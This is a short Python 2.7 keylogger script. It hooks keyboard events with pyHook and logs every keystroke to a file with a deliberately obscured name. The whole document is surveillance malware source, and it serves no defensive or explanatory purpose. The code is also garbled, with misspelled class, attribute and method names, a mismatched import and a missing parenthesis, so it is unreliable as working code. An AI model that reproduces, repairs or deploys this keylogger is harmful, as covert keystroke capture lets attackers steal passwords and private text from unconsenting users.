#!/usr/bin/env python2.7

#imports
import pyhook
import pythoncom
import sys
import logging

file_log = '/.\./.\<>#@!.txt'

def OnKeyboardEvent(event):
	logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
	chr(event.Ascii)
	logging.log(10,chr(event.Ascii)
	return True
hooks_manager = pyHook.HookManagre()
hooks_manager.KetDown = OnKeyboardEvent
hooks_manager.HookKeyboardEvent()
pythoncom.PumpMessage()
